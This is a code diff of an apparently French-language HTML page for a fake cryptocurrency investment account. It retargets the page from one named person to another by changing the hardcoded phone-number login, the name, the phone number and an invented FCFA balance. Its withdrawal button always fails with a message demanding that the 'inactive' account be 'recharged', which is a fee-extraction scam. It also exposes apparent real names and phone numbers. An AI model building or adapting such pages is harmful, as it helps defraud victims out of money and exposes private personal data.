@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0779307946") {
+        if (code === "0141856960") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 300 000 FCFA</span>
+                <span class="balance">Solde: 4 150 000 FCFA</span>
                 <div class="account-info">
-                    <span id="user-name"> BENE LOU ZILO HERVELINE </span><br>
-                    <span id="user-phone"> 225 077 930 7946 </span>
+                    <span id="user-name"> ISSA SANOGO </span><br>
+                    <span id="user-phone"> 225 01 41 85 69 60 </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -310,9 +310,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "BENE LOU ZILO HERVELINE";
-                const accountNumber = "225 077 930 7946";
-                const balance = "1 300 000 FCFA";
+                const accountName = "ISSA SANOGO";
+                const accountNumber = "225 01 41 85 69 60";
+                const balance = "4 150 000 FCFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher BENE, Les bénéfices des cryptomonaies ne peuvent pas vous parvenir car votre compte es inactif, veuillez le recharger afin de recevoir vos bénéfices immediatement.');
+                alert('Cher ISSA, Les bénéfices des cryptomonaies ne peuvent pas vous parvenir car votre compte es inactif, veuillez le recharger afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : compte inactif.';
